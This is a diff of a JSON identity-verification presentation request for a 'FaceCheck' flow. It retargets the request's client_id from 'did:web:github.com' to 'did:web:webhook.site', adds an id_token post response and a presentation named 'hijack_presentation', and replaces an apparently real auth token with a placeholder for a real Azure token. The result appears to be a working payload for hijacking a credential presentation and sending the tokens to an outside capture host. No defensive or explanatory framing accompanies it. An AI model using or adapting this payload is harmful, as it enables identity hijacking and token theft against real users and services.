@@ -1,9 +1,13 @@
 {
-  "client_id": "did:web:github.com",
+  "client_id": "did:web:webhook.site",
+  "response_type": "id_token",
+  "response_mode": "post",
+  "scope": "openid",
   "nonce": "random_nonce_123",
   "claims": {
     "vp_token": {
       "presentation_definition": {
+        "id": "hijack_presentation",
         "input_descriptors": [
           {
             "id": "FaceCheck",
@@ -14,7 +18,7 @@
           }
         ],
         "facecheck_session_token": {
-          "authToken": "lyr0QqYPTaODhT0F6u+DJQ"
+          "authToken": "YOUR_REAL_AZURE_TOKEN"
         }
       }
     }
